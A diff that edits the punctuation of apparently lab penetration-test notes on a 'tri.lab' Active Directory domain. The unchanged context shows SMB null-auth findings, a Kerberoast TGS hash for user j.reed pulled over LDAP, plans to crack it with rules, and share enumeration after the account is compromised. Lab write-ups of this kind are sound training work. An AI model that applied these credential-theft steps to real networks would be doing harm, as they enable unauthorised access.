@@ -202,13 +202,13 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 # SMB (445)
 ## BIKE-SRV
-There is no null auth
+There is no null auth,
 Guest account is disabled
 ## RUN-SRV
-Null auth is enabled here, however i cannot look at any shares or enumerate any users
+Null auth is enabled here, however i cannot look at any shares or enumerate any users,
 Guest account is disabled here as well
 ## SWIM-SRV
-Null auth disabled here
+Null auth disabled here,
 Guest account disabled
 
 # Users
@@ -394,8 +394,7 @@ LDAP        RUN-SRV.tri.lab 389    RUN-SRV          [+] tri.lab\t.spivey account
 LDAP        RUN-SRV.tri.lab 389    RUN-SRV          [*] Total of records returned 1
 LDAP        RUN-SRV.tri.lab 389    RUN-SRV          $krb5tgs$23$*j.reed$TRI.LAB$j.reed*$cdd8385cab44e6c64a736da6a4b64c3f$857d2fe30e960e15a57ed7b4b4844dce45f3bbd3e5aab41aba054b0d6fdb906f200acc0cb2f195e1547c4c2e3528ff3181e33ff30ccf8817b8134a2cd82ba288dfd3466884d0ebebf001d07d14f762ae54a246636f6dcfef4bcc70bee35fd096fd3d845b0f0b25cd6ea85fc5c6b9732d9fdb996e4fd35331b379f9b89de5e28a360971673837ac20339a341953626f52ba8b9e635b01881a1bcdfa6cbb2cc5dbef0319f871815ba80256cf7ca49d548d234dc51f80f066ecbb85e85a0932e8ad7adefa43661b395722a97885062ace3fd662bc1ade8919709c52d803228ddc065b7d14170e9f48a91d3a11bc387cbd2d1037130a36e5ae624eb2ede496c0cd938fc93b9d7d20ba97ab8ba8bf33c5bf1edcf9d1866fa37dddbd1a8668dd9ac2ff3ed999ac8622544a9eebe1a96272a7e31b86a99349830758ce1713112b875cfe100d10d8b84ba436c49bc9501e605f071494767c3139ece79c3951fe754b7eea107f825c4717ad028c3d3f1c9d4eb2fc0b85cb49a862f8528623a0c1c5a526008e626f0108d6dd9169c411a03f3ac8492a61b906f6ae54e1dca22af26c5c159f2c5d044f973689968dadb2408f61205031be6ee498588b94b7d1b3e891f086ef604343f8515b7089c8b2fdaa60fa91a2c6b8b12093fdd1fee807fec2057433aa841d5ff11e5010a60d9ab6e9d82381c025ec22f499cefadc5e474cc8762fb5b930759c3f03e453815f69e24d9012720437d7afbeade8f1c41b9c98e4a50c19344c7d9e65146dfa5fb76b974977ad956385b5ed15e75c10afda9515e6f55c45a067382d5c73078a8bde76fc6911a0f338fd27ac79b4366d5e1af9057aa1508deb17a9fea57cfed57b7dce7af71b1dec3a07f34e84713ce14ef325d7b4c81bcacccba6bd2d6b9b11f3ea80fbfe259473b606db6c71e97f961ce173f3a45cc6c6a72fd19519165662bfab8758f80094d32a2d44b29404808e7784c82ae7a7205296b54fc9d0d1af18ac74fe433eab409c947728a82b81f681fd249493cc24c336147e23af890048b6c9c21d300416143f68bb6daf2deb65b18072e139fedbf1369169ce236f87a948e4feec184dd376adf7639699a47f63672a34c9bca3f68e040f7c30ea27c81c7c461fb4d9d2e8ce35c9c870ea1c2ca26befb87e8c65095adb2c886980281711e9f4d8fff9e3ac24eb0c4a5bd5dab86551e2a784f537b4056896c50b5f6eb1648e182aa0cec8a9c71265d3ce00aca5462b800849f9e19e60290d79e1c9f6361d3f88043e64c44001665f52a2483eeb97a097a2d02c67b1c8a3552e17e69ccdee9329e9735ee28c64137ad3e3cfab1ad56538e260f4963daa6dd8a911b976e6260fc6862970ef71a3393b286d20d13ae56714
 ```
-I now have the hash of the user `j.reed`
-This hash is not cracking by regular means but i can try rule based cracking
+I now have the hash of the user `j.reed`. This hash is not cracking by regular means but i can try rule based cracking.
 
 ## Cracking the hash
 ```python
@@ -423,11 +422,7 @@ SMB         10.1.107.4      445    RUN-SRV          IPC$            READ        
 SMB         10.1.107.4      445    RUN-SRV          NETLOGON        READ            Logon server share 
 SMB         10.1.107.4      445    RUN-SRV          SYSVOL          READ            Logon server share
 ```
-This user is now compromised
-He has read access on the default shares, its also worth noting there is no non-default shares
-It might be worth running Get-GPPPassword.py to find group policy passwords in these shares
-So there is no group policy password in those shares
-This also has no remote access of any kind on any of the systems
+This user is now compromised.He has read access on the default shares, its also worth noting there is no non-default shares. It might be worth running Get-GPPPassword.py to find group policy passwords in these shares. So there is no group policy password in those shares. This also has no remote access of any kind on any of the systems
 
 # Dumping users
 ```python
